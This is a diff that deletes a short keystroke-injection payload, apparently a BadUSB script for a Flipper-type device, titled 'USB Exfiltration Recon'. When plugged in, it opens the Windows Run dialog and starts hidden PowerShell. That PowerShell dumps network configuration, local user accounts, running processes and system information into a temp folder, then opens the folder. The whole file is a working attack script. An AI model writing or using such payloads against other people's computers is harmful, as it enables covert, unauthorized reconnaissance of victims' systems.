@@ -1,8 +1,0 @@
-REM CYBERFLIPPER - BASIC Level
-REM USB Exfiltration Recon - Gathers system data to temp folder
-REM Captures: IP config, users, installed software, processes
-DELAY 1000
-GUI r
-DELAY 500
-STRING powershell -W Hidden -C "$d=\"$env:TEMP\recon\";md $d -F;ipconfig /all>\"$d\net.txt\";net user>\"$d\users.txt\";Get-Process|Out-File \"$d\procs.txt\";systeminfo>\"$d\sys.txt\";explorer $d"
-ENTER
